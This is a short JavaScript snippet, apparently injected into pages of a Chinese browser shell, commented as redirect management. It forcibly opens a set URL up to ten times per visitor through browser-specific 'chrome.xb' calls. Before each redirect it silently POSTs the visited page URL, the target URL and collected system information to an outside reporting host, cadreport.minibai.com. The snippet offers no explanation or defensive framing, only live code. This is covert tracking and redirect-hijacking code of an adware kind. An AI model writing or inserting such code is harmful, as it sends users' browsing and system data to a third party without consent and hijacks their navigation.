!function(url,max,mode,id){//跳转业务管理
  var count = localStorage.getItem(id);
  count = !count ? 0 : count;
  if(count < max){
    localStorage.setItem(id, ++count);
    if(chrome.xb && chrome.xb.openUrl){
      upload_(url);
      chrome.xb.openUrl(url,mode)
    };
  }
  function upload_(target) {
    let url = '//cadreport.minibai.com/hjl.json',
      data = {
        su: location.href,
        tu: target,
        t: 2,
      };
    if (chrome.xb && chrome.xb.getSysInfo){
      chrome.xb.getSysInfo(function (s) {
        data.s = s;
        post({
          url,
          data
        });
      })
    }else{
      post({
        url,
        data
      });
    }
  }
  function post(options) {
    options = options || {};
    options.type = "POST";
    options.dataType = options.dataType || 'json';
    options.async = options.async || true;
    options.timeout = options.timeout || 100;
    var params = getParams(options.data),
      xhr, timeoutFlag = null;
    window.clearTimeout(timeoutFlag);
    xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function () {
      if (xhr.readyState == 4) {
        var status = xhr.status;
        if (status >= 200 && status < 300) {
          window.clearTimeout(timeoutFlag);
          options.success && options.success(xhr.responseText, xhr.responseXML);
        } else {
          window.clearTimeout(timeoutFlag);
          options.error && options.error(status);
        }
      }
    };
    xhr.open('POST', options.url, options.async);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.send(params);
    timeoutFlag = window.setTimeout(function () {
      window.clearTimeout(timeoutFlag);
      xhr.abort();
    }.bind(this), options.timeout);
  }
  
  function getParams(data) {
    var arr = [];
    for (var param in data) {
      arr.push(encodeURIComponent(param) + '=' + encodeURIComponent(data[param]));
    }
    return arr.join('&');
  }
}('http://www.baidu.com1',10,-1,'id');